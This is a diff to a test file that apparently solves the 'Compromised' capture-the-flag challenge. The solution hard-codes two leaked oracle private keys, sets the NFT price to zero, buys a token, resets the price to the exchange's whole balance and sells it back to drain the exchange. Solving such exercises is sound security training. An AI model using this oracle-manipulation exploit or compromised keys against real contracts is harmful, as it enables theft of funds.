@@ -52,7 +52,30 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const keys = [
+            '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
+            '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+        ];
+        const signers = keys.map(key => new ethers.Wallet(key, ethers.provider));
+        for(signer of signers) {
+            await oracle.connect(signer).postPrice('DVNFT', 0);
+        }
+
+        const tx = await exchange.connect(player).buyOne({value: 1});
+        const receipt = await tx.wait();
+        const events = receipt.events.filter(event => {
+             return event.event == 'TokenBought';
+        });
+        expect(events.length == 1);
+        const tokenId = events[0].args.tokenId
+
+        const balance = await ethers.provider.getBalance(exchange.address);
+        for(signer of signers) {
+            await oracle.connect(signer).postPrice('DVNFT', balance);
+        }
+
+        await nftToken.connect(player).approve(exchange.address, tokenId);
+        await exchange.connect(player).sellOne(tokenId);
     });
 
     after(async function () {
